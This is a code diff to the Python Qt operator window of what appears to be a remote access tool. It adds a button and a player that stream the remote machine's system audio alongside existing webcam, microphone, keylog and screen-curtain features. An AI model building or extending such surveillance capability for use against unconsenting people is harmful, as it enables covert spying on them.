@@ -144,8 +144,9 @@ class SessionWindow(QMainWindow):
         self.webcam_win = WebcamWindow(self)
         self.webcam_win.closed.connect(self.stop_webcam)
         
-        # Audio Player
+        # Audio Players
         self.player = AudioPlayer()
+        self.sys_player = AudioPlayer() # Separate player for system loopback
 
         # Toolbar
         self.setup_toolbar()
@@ -155,6 +156,7 @@ class SessionWindow(QMainWindow):
         self.worker.frame_received.connect(self.canvas.update_frame)
         self.worker.cam_received.connect(self.webcam_win.update_frame)
         self.worker.audio_received.connect(self.player.play_chunk)
+        self.worker.sys_audio_received.connect(self.sys_player.play_chunk)
         self.worker.log_received.connect(self.keylog_widget.append_log)
         self.worker.connection_lost.connect(self.on_disconnect)
         self.worker.connection_progress.connect(self._on_progress)
@@ -245,6 +247,11 @@ class SessionWindow(QMainWindow):
         self.act_mic = QAction("🎙️ Audio", self, checkable=True)
         self.act_mic.triggered.connect(self.toggle_mic)
         self.toolbar.addAction(self.act_mic)
+        
+        # System Audio
+        self.act_sys_audio = QAction("🔊 System", self, checkable=True)
+        self.act_sys_audio.triggered.connect(self.toggle_sys_audio)
+        self.toolbar.addAction(self.act_sys_audio)
         
         self.toolbar.addSeparator()
         
@@ -485,6 +492,20 @@ class SessionWindow(QMainWindow):
         else:
             self.player.stop()
             self.send_command(protocol.OP_MIC_STOP)
+
+    def toggle_sys_audio(self, checked):
+        if not self.worker.is_connected():
+            self.act_sys_audio.setChecked(not checked)
+            return
+
+        if checked:
+            if self.sys_player.start():
+                self.send_command(protocol.OP_SYS_AUDIO_START)
+            else:
+                self.act_sys_audio.setChecked(False)
+        else:
+            self.sys_player.stop()
+            self.send_command(protocol.OP_SYS_AUDIO_STOP)
 
     def show_curtain_dialog(self):
         dialog = CurtainDialog(self)
